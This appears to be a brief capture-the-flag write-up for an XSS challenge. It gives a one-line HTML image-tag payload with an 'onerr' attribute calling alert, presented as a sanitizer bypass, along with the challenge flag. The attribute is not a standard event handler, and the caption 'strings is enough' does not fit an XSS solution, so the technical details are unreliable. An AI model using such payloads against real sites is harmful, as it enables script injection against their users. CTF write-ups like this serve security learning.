---
title: 'Xss'
date: 2024-12-09T06:11:40+05:30
draft: false
---

## Solution

```html
<img src="42" onerr="alert(2)">
```

![`strings` is enough](/posts/root@localhost_writeup_assets/xss.png)

### Flag: `root@localhost{Byp4ss_Sanitiz3r_123}`
